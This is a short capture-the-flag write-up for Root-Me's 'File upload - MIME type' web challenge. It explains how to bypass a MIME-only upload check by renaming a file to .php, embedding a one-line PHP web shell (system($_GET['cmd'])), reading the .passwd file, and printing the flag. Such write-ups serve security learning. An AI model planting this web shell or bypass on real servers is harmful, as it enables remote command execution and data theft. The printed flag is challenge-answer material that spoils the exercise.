## Challenge name: File upload - MIME type

``` Challenge Link:``` [https://www.root-me.org/en/Challenges/Web-Server/File-upload-MIME-type](https://www.root-me.org/en/Challenges/Web-Server/File-upload-MIME-type)

**After starting the challenge we can see a photo gallery and we can upload images in it.**

**We will open burpsuite to analyze request while we upload files and try to bypass the file upload logic and instead of image we will upload .php file to run arbitrary commands on server.**

**From the original request we will change the file name from `filename="image.jpg"` to `filename="image.php"` because as the challenge suggests it only checks mime type `Content-Type: image/jpeg`**

**Also we will put this php code somewhere inside the image data:**
```
<?php system($_GET["cmd"]); ?>
```

**After forwarding the request we can see success message. We can see .passwd in users home folder after doing ls in it.**

**We got our flag/passwd as "a7n4nizpgQgnPERy89uanf6T4" we can use this to solve the challenge.**

**Thankyou.**
